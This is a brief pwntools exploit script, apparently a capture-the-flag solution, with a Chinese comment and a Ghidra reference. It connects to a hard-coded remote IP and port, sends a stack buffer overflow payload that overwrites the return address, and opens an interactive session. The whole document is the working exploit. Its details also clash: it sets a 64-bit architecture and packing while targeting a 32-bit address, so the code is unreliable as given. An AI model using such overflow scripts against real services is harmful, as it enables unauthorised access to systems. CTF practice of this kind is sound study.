#!/usr/bin/python
from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51002)
# r = process("./vuln")
pause()
r.sendline(b"a" * 0x4C + p64(0x80491F6))
r.interactive()

# 只需要找到对应的偏移地址就可以了
# 在Ghidra中的语句：        08049284 8d 45 b8        LEA        EAX=>s,[EBP + -0x48]
